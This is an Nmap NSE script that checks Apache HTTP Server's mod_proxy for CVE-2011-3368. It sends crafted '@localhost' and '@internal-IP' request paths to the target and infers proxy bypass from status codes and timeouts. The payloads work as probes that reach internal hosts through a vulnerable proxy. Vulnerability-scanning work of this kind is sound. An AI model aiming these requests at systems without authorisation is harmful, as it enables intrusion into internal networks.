local http = require "http"
local os = require "os"
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"
local vulns = require "vulns"

local openssl = stdnse.silent_require "openssl"

description = [[
Tests for the CVE-2011-3368 (Reverse Proxy Bypass) vulnerability in Apache HTTP server's reverse proxy mode.
The script will run 3 tests:
 o the loopback test, with 3 payloads to handle different rewrite rules
 o the internal hosts test. According to Contextis, we expect a delay before a server error.
 o The external website test. This does not mean that you can reach a LAN ip, but this is a relevant issue anyway.

References:
 * http://www.contextis.com/research/blog/reverseproxybypass/
]]

---
-- @usage
-- nmap --script http-vuln-cve2011-3368 <targets>
--
-- @output
-- PORT   STATE SERVICE 
-- 80/tcp open  http
-- | http-vuln-cve2011-3368: 
-- |   VULNERABLE:
-- |   Apache mod_proxy Reverse Proxy Security Bypass
-- |     State: VULNERABLE
-- |     IDs:  CVE:CVE-2011-3368  OSVDB:76079
-- |     Description:
-- |       An exposure was reported affecting the use of Apache HTTP Server in
-- |       reverse proxy mode. The exposure could inadvertently expose internal
-- |       servers to remote users who send carefully crafted requests.
-- |     Disclosure date: 2011-10-05
-- |     Extra information:
-- |       Proxy allows requests to external websites
-- |     References:
-- |       http://osvdb.org/76079
-- |_      http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3368
--
-- @args http-vuln-cve2011-3368.prefix sets the path prefix (directory) to check for the vulnerability.
--

author = "Ange Gutek, Patrik Karlsson"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"intrusive", "vuln"}



portrule = shortport.http

action = function(host, port)
	
	local vuln = {
		title = 'Apache mod_proxy Reverse Proxy Security Bypass',
		IDS = { CVE='CVE-2011-3368', OSVDB='76079'},
		description = [[
An exposure was reported affecting the use of Apache HTTP Server in
reverse proxy mode. The exposure could inadvertently expose internal
servers to remote users who send carefully crafted requests.]],
		references = { 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3368' },
		dates = {
			disclosure = { year='2011', month='10', day='05'}
		},
	}

	local report = vulns.Report:new(SCRIPT_NAME, host, port)
	local prefix = stdnse.get_script_args("http-vuln-cve2011-3368.prefix") or ""

	-- Take a reference chrono for a 404
	local start = os.time(os.date('*t'))
	local random_page = stdnse.tohex(openssl.sha1(openssl.rand_pseudo_bytes(512)))
	local reference = http.get(host,port,("%s/%s.htm"):format(prefix,random_page))
	local chrono_404 = os.time(os.date('*t'))-start

	-- TEST 1: the loopback test, with 3 payloads to handle different rewrite rules
	local all
	all = http.pipeline_add(("%s@localhost"):format(prefix),nil, all)
	all = http.pipeline_add(("%s:@localhost"):format(prefix),nil, all)
	all = http.pipeline_add(("%s:@localhost:80"):format(prefix), nil, all)

	local bypass_request = http.pipeline_go(host,port, all)
	if ( not(bypass_request) ) then
		stdnse.print_debug(1, "%s : got no answers from pipelined queries", SCRIPT_NAME)
		return "\n  ERROR: Got no answers from pipelined queries"
	end
  

	-- going through the results of TEST 1 we could see
	-- * 200 OK
	--    o This could be the result of the server being vulnerable
	--    o This could also be the result of a generic error page
	-- * 40X Error
	--    o This is most likely the result of the server NOT being vulnerable
	--
	-- We can not determine whether the server is vulnerable or not solely
	-- by relying on the 200 OK. If we have no 200 OK abort, otherwise continue
	local got_200_ok
	for _, response in ipairs(bypass_request) do
		if ( response.status == 200 ) then
			got_200_ok = true
		end
	end
	
	-- if we didn't get at least one 200 OK, the server is most like NOT vulnerable
	if ( not(got_200_ok) ) then
		vuln.state = vulns.STATE.NOT_VULN
		return report:make_output(vuln)
	end

  	for i=1, #bypass_request, 1 do
		stdnse.print_debug(1, "%s : test %d returned a %d", SCRIPT_NAME,i,bypass_request[i].status)

		-- here a 400 should be the evidence for a patched server.
		if ( bypass_request[i].status == 200 and vuln.state ~= vulns.STATE.VULN )  then 
	
			-- TEST 2: the internal hosts test. According to Contextis, we expect a delay before a server error. 
			-- According to my (Patrik) tests, internal hosts reachable by the server may return instant responses
			local tests = { 
				{ prefix = "", suffix = "" },
				{ prefix = ":", suffix = ""},
				{ prefix = ":", suffix = ":80"}
			}
			
			-- try a bunch of hosts, and hope we hit one thats
			-- not on the network, this will give us the delay we're expecting
			local hosts = {
				"10.10.10.10",
				"192.168.211.211",
				"172.16.16.16"
			}
			
			-- perform one request for each host, and stop once we
			-- receive a timeout for one of them
			for _, h in ipairs(hosts) do
				local response = http.get(
					host, 
					port, 
					("%s%s@%s%s"):format(prefix, tests[i].prefix, h, tests[i].suffix),
					{ timeout = ( chrono_404 + 5 ) * 1000 }
				)
				-- check if the GET timed out	
				if ( not(response.status) ) then
					vuln.state = vulns.STATE.VULN
					break
				end
			end	
		end
	end

	-- TEST 3: The external website test. This does not mean that you can reach a LAN ip, but this is a relevant issue anyway.
	local external = http.get(host,port, ("@scanme.nmap.org"):format(prefix))
	if ( external.status == 200 and string.match(external.body,"Go ahead and ScanMe") ) then
		vuln.extra_info = "Proxy allows requests to external websites"
	end
	return report:make_output(vuln) 
end

